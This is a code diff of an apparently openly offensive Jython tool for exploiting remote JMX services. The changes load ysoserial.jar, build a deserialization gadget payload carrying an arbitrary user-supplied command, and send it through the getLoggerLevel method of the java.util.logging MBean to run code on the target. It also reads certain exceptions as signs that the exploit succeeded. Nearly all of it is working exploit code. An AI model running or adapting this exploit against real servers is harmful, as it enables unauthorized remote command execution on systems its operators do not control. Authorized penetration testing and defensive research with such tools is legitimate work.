@@ -14,6 +14,7 @@ from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 from threading import Thread
 
 import sys
+import os
 import time
 import jarray
 from jarray import array
@@ -65,8 +66,12 @@ def connectToJMX(args):
         print "[+] Connected: " + str(jmx_connector.getConnectionId())
         bean_server = jmx_connector.getMBeanServerConnection()
         return bean_server
-    except IOException:
+    except:
         print "[-] Error: Can't connect to remote service"
+        
+        if "Authentication failed! Invalid username or password" in str(sys.exc_info()[1]):
+           print "[-] Authentication failed! Invalid username or password"
+
         sys.exit(-1)
 ##########
 
@@ -323,43 +328,51 @@ def startShell(password, bean_server):
 ### DESERIALIZATION MODE ###
 
 def deserializationMode(args):
-    bean_server = connectToJMX(args)
-    deployObject(args.gadget, args.cmd, bean_server)
-    print "[+] Done"
 
-def deployObject(gadget, cmd, bean_server):
+    if not os.path.isfile('./ysoserial.jar'):
+        print "[-] Error: Did not find ysoserial.jar in this folder. Please download it from https://github.com/frohoff/ysoserial"
+        sys.exit(1)
+
+    sys.path.append("./ysoserial.jar")
+    print "[+] Added ysoserial API capacities"
+    
+    from ysoserial.payloads.ObjectPayload import Utils
+    
+    # Connect to the JMX server
+    bean_server = connectToJMX(args)
+
+
+    # Generate deserialization object with ysoserial.jar
+    payload_object = Utils.makePayloadObject(args.gadget, args.cmd)
+
     # Command execution
     # Load default MLet java.util.logging and invoke method getLoggerLevel on it
     mlet_bean = bean_server.getObjectInstance(ObjectName("java.util.logging:type=Logging"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
-    
-    try:
-        # Load the ysoserial.jar file
-        sys.path.append("./ysoserial.jar")
-    except:
-        print "[-] Error: Did not find ysoserial.jar in MogwaiLabsMJet folder"
-        sys.exit(0)
-    print "[+] Added ysoserial API capacities"
-    
-    from ysoserial.payloads.ObjectPayload import Utils
-   
-    # Generate deserialization object with ysoserial.jar
-    payload_object = Utils.makePayloadObject(gadget, cmd)
-    
-    print "[+] Deploying object"
+
+    print "[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)"
     inv_array1 = jarray.zeros(1, Object)
     inv_array1[0] = payload_object
 
     inv_array2 = jarray.zeros(1, String)
     inv_array2[0] = String.canonicalName
 
-    resource = bean_server.invoke(mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)
+    try:
+       resource = bean_server.invoke(mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)
 
-    print resource
+    except:
+        if "argument type mismatch" in str(sys.exc_info()[1]):
+           print "[+] Got an argument type mismatch exception - this is expected"
+
+        elif "Access denied! Invalid access level" in str(sys.exc_info()[1]):
+            print "[+] Got an access denied exception - this is expected"
+        else:
+           print "[-] Got a " + str(sys.exc_info()[1]) + "exception, exploitation failed"
 
     sys.stdout.write("\n")
     sys.stdout.flush()
 
+    print "[+] Done"
 
 ### /DESERIALIZATION MODE ###
 
